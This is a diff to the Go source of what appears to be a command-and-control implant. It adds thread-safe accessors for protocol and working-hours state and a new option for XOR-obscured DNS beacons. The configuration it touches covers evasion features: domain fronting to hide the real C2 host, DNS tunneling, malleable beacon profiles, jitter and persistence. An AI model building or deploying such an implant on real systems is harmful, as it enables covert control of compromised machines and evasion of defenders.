@@ -13,6 +13,7 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"sync"
 	"sync/atomic"
 	"time"
 
@@ -23,46 +24,46 @@ import (
 // This source is used exclusively by the Generate Agent flow (EXE).
 // IMPORTANT: -X can ONLY set string variables. Non-strings are injected as *Str and parsed in init().
 var (
-	C2URL                   string            = s(SC2DefaultURL)
-	c2URLsAtomic            atomic.Value      // immutable snapshot of C2 URLs (published via c2URLsStore)
-	currentC2Idx            atomic.Int32      // index of last working C2 server (atomic: read by screenshot goroutine, written by C2 senders)
-	IntervalStr             string            = "10"
-	JitterStr               string            = "20"
-	UserAgent               string            = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-	PersistStr              string            = "false"
-	SkipTLSVerifyStr        string            = "false" // default secure; change to "true" for self-signed C2 certs
-	Protocol                string            = "http"  // "http" or "tcp" injected via ldflags
-	DebugStr                string            = "false" // set via ldflags for debug builds (stealth default false)
-	FastInterval            int               = 1       // Fast interval for screen monitoring (1 second)
-	BeaconURIStr            string            = s(SBeaconURI)
-	BeaconMethodStr         string            = s(SBeaconMethod)
-	ListenerIDStr           string            = "0"
-	P2PMode                 string            = ""                            // "", "smb", "tcp"
-	P2PParent               string            = ""                            // parent agent to connect to (child mode)
-	P2PListenAddr           string            = ""                            // listen addr for children (parent mode)
-	DNSDomain               string            = ""                            // DNS C2 domain (e.g. "c2.example.com")
-	DNSServer               string            = ""                            // DNS C2 server IP
-	DNSDoHURL               string            = ""                            // DNS-over-HTTPS endpoint (e.g. "https://dns.google/dns-query")
-	DNSDoTAddr              string            = ""                            // DNS-over-TLS address:port (e.g. "1.1.1.1:853")
-	DNSIPv6                 bool              = false                         // enable IPv6 AAAA record tunneling
-	DNSARecordTunnel        bool              = false                         // enable A-record tunneling (response payload packed into 4-byte A rdata)
-	DNSTCP                  bool              = false                         // send DNS queries over TCP (RFC 1035 length-prefixed) instead of UDP
-	DNSObscure              bool              = false                         // XOR-obscure DNS fragments/responses keyed by the agent UUID
-	ProxyStr                string            = ""                            // HTTP proxy URL (e.g. "http://proxy:8080")
-	CryptoKeyStr            string            = ""                            // 32-byte hex key for beacon payload encryption ("" = disabled)
-	BeaconKeyStr            string            = ""                            // pre-shared key used to derive registration auth ("" = no PSK auth)
-	RegSecretIDStr          string            = ""                            // v3: per-implant registration secret id ("" = v2 master-key derivation)
-	RegSecretStr            string            = ""                            // v3: per-implant registration secret, base64 ("" = v2 master-key derivation)
-	P2PSharedSecret         string            = ""                            // P2P relay pre-shared key (base64 32 bytes). Build pipelines stamp this via -ldflags so parent + child implants share a mesh key. "" = no P2P auth (legacy)
-	DomainFront             string            = ""                            // Domain fronting: when set, the TLS SNI (via uTLS) and HTTP Host header both present this domain while the connection still egresses to C2URL. Point C2URL at the CDN/proxy edge and set DomainFront to the fronted hostname so passive observers (and the CDN) see only the fronted domain. "" = disabled
-	ContentLengthJitter     int               = 0                             // Max random padding bytes for HTTP/WS beacon body (0=disabled)
-	MalleablePrepend        string            = ""                            // bytes prepended to every HTTP beacon response body (server malleable profile)
+	C2URL               string       = s(SC2DefaultURL)
+	c2URLsAtomic        atomic.Value // immutable snapshot of C2 URLs (published via c2URLsStore)
+	currentC2Idx        atomic.Int32 // index of last working C2 server (atomic: read by screenshot goroutine, written by C2 senders)
+	IntervalStr         string       = "10"
+	JitterStr           string       = "20"
+	UserAgent           string       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+	PersistStr          string       = "false"
+	SkipTLSVerifyStr    string       = "false" // default secure; change to "true" for self-signed C2 certs
+	Protocol            string       = "http"  // "http" or "tcp" injected via ldflags
+	DebugStr            string       = "false" // set via ldflags for debug builds (stealth default false)
+	FastInterval        int          = 1       // Fast interval for screen monitoring (1 second)
+	BeaconURIStr        string       = s(SBeaconURI)
+	BeaconMethodStr     string       = s(SBeaconMethod)
+	ListenerIDStr       string       = "0"
+	P2PMode             string       = ""    // "", "smb", "tcp"
+	P2PParent           string       = ""    // parent agent to connect to (child mode)
+	P2PListenAddr       string       = ""    // listen addr for children (parent mode)
+	DNSDomain           string       = ""    // DNS C2 domain (e.g. "c2.example.com")
+	DNSServer           string       = ""    // DNS C2 server IP
+	DNSDoHURL           string       = ""    // DNS-over-HTTPS endpoint (e.g. "https://dns.google/dns-query")
+	DNSDoTAddr          string       = ""    // DNS-over-TLS address:port (e.g. "1.1.1.1:853")
+	DNSIPv6             bool         = false // enable IPv6 AAAA record tunneling
+	DNSARecordTunnel    bool         = false // enable A-record tunneling (response payload packed into 4-byte A rdata)
+	DNSTCP              bool         = false // send DNS queries over TCP (RFC 1035 length-prefixed) instead of UDP
+	DNSObscure          bool         = false // XOR-obscure DNS fragments/responses keyed by the agent UUID
+	ProxyStr            string       = ""    // HTTP proxy URL (e.g. "http://proxy:8080")
+	CryptoKeyStr        string       = ""    // 32-byte hex key for beacon payload encryption ("" = disabled)
+	BeaconKeyStr        string       = ""    // pre-shared key used to derive registration auth ("" = no PSK auth)
+	RegSecretIDStr      string       = ""    // v3: per-implant registration secret id ("" = v2 master-key derivation)
+	RegSecretStr        string       = ""    // v3: per-implant registration secret, base64 ("" = v2 master-key derivation)
+	P2PSharedSecret     string       = ""    // P2P relay pre-shared key (base64 32 bytes). Build pipelines stamp this via -ldflags so parent + child implants share a mesh key. "" = no P2P auth (legacy)
+	DomainFront         string       = ""    // Domain fronting: when set, the TLS SNI (via uTLS) and HTTP Host header both present this domain while the connection still egresses to C2URL. Point C2URL at the CDN/proxy edge and set DomainFront to the fronted hostname so passive observers (and the CDN) see only the fronted domain. "" = disabled
+	ContentLengthJitter int          = 0     // Max random padding bytes for HTTP/WS beacon body (0=disabled)
+	MalleablePrepend    string       = ""    // bytes prepended to every HTTP beacon response body (server malleable profile)
 	// MalleableRespDecode holds the serialized output transforms (e.g.
 	// "base64;xor:microsoft") of the server's malleable profile. When non-empty
 	// the agent reverses them on every HTTP beacon response so the encrypted
 	// envelope can be recovered (without it the profile-preset C2 pipeline is
 	// dead for the live agent). Delivered over-the-wire when a profile is set.
-	MalleableRespDecode string = ""
+	MalleableRespDecode     string            = ""
 	MalleableAppend         string            = ""                            // bytes appended to every HTTP beacon response body (server malleable profile)
 	MalleableRequestPrepend string            = ""                            // bytes prepended to the agent's OUTGOING HTTP beacon body (server strips on inbound)
 	MalleableRequestAppend  string            = ""                            // bytes appended to the agent's OUTGOING HTTP beacon body (server strips on inbound)
@@ -152,12 +153,60 @@ var deadTimeout time.Duration  // parsed from DeadTimeoutStr
 var dnsConsecutiveFailures int // DNS beacon consecutive failure count
 const dnsFallbackThreshold = 5 // fallback to HTTP after this many DNS failures
 
-// Working hours runtime state
-var (
-	workingStart string // HH:MM start (from WorkingStartStr)
-	workingEnd   string // HH:MM end (from WorkingEndStr)
-	workingTZ    string // IANA timezone (from WorkingTZStr)
-)
+// protoMu guards Protocol and BeaconTransport: the beacon loop mutates them
+// on transport fallback/rotation while task workers (screenshots, quick
+// results, c2mode queries) read them concurrently.
+var protoMu sync.RWMutex
+
+func getProtocol() string {
+	protoMu.RLock()
+	defer protoMu.RUnlock()
+	return Protocol
+}
+
+func setProtocol(v string) {
+	protoMu.Lock()
+	Protocol = v
+	protoMu.Unlock()
+}
+
+func getBeaconTransport() string {
+	protoMu.RLock()
+	defer protoMu.RUnlock()
+	return BeaconTransport
+}
+
+func setBeaconTransport(v string) {
+	protoMu.Lock()
+	BeaconTransport = v
+	protoMu.Unlock()
+}
+
+func setProtocolAndTransport(p, b string) {
+	protoMu.Lock()
+	Protocol, BeaconTransport = p, b
+	protoMu.Unlock()
+}
+
+// Working hours runtime state. Kept behind an atomic.Value so config tasks
+// can update it while the beacon loop reads it without a data race (each
+// read sees a consistent immutable snapshot).
+type workingHoursState struct {
+	start, end, tz string // HH:MM start/end, IANA timezone
+}
+
+var workingHours atomic.Value // holds workingHoursState
+
+func getWorkingHours() workingHoursState {
+	if v, ok := workingHours.Load().(workingHoursState); ok {
+		return v
+	}
+	return workingHoursState{}
+}
+
+func setWorkingHours(start, end, tz string) {
+	workingHours.Store(workingHoursState{start: start, end: end, tz: tz})
+}
 
 // Kill date runtime state
 var killDateParsed time.Time // parsed from KillDateStr
@@ -184,6 +233,7 @@ type agentConfigBlob struct {
 	DNSServer        string `json:"dns_server"`
 	DNSDoHURL        string `json:"dns_doh"`
 	DNSDoTAddr       string `json:"dns_dot"`
+	DNSObscure       string `json:"dns_obscure"`
 	Proxy            string `json:"proxy"`
 	CryptoKey        string `json:"crypto_key"`
 	BeaconKey        string `json:"beacon_key"`
@@ -314,19 +364,19 @@ func applyServerNetworkConfig(b64 string) {
 		c2URL = ""
 	}
 	b := agentConfigBlob{
-		C2URL:            c2URL,
-		Protocol:         nc.Protocol,
-		BeaconTransport:  nc.BeaconTransport,
-		UserAgent:        nc.UserAgent,
-		Proxy:            nc.Proxy,
-		SkipTLSVerify:    boolToStr(nc.SkipTLSVerify),
-		DNSDomain:        nc.DNSDomain,
-		DNSServer:        nc.DNSServer,
-		DomainFront:      nc.DomainFront,
-		MalleablePrepend: nc.MalleablePrepend,
-		MalleableAppend:  nc.MalleableAppend,
+		C2URL:               c2URL,
+		Protocol:            nc.Protocol,
+		BeaconTransport:     nc.BeaconTransport,
+		UserAgent:           nc.UserAgent,
+		Proxy:               nc.Proxy,
+		SkipTLSVerify:       boolToStr(nc.SkipTLSVerify),
+		DNSDomain:           nc.DNSDomain,
+		DNSServer:           nc.DNSServer,
+		DomainFront:         nc.DomainFront,
+		MalleablePrepend:    nc.MalleablePrepend,
+		MalleableAppend:     nc.MalleableAppend,
 		MalleableRespDecode: nc.MalleableRespDecode,
-		BeaconURI:        nc.BeaconURI,
+		BeaconURI:           nc.BeaconURI,
 	}
 	if nc.RequestPrepend != "" {
 		b.MalleableRequestPrepend = nc.RequestPrepend
@@ -406,7 +456,7 @@ func (b *agentConfigBlob) apply() {
 		SkipTLSVerifyStr = b.SkipTLSVerify
 	}
 	if b.Protocol != "" {
-		Protocol = b.Protocol
+		setProtocol(b.Protocol)
 	}
 	if b.Debug != "" {
 		DebugStr = b.Debug
@@ -440,6 +490,9 @@ func (b *agentConfigBlob) apply() {
 	}
 	if b.DNSDoTAddr != "" {
 		DNSDoTAddr = b.DNSDoTAddr
+	}
+	if b.DNSObscure == "true" {
+		DNSObscure = true
 	}
 	if b.Proxy != "" {
 		ProxyStr = b.Proxy
